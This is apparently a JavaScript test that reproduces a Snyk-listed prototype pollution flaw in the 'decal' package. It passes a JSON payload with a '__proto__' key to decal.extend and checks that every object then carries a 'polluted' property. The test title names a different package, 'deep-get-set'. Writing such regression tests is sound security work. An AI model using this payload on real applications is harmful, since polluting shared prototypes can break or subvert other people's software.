//https://snyk.io/vuln/SNYK-JS-DECAL-1051028
test("prototype pollution in deep-get-set", () => {
  const decal = require("decal");

  expect({}.polluted).toBe(undefined);

  const o = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  decal.extend({}, true, o);

  expect({}.polluted).toBe("yes");
});
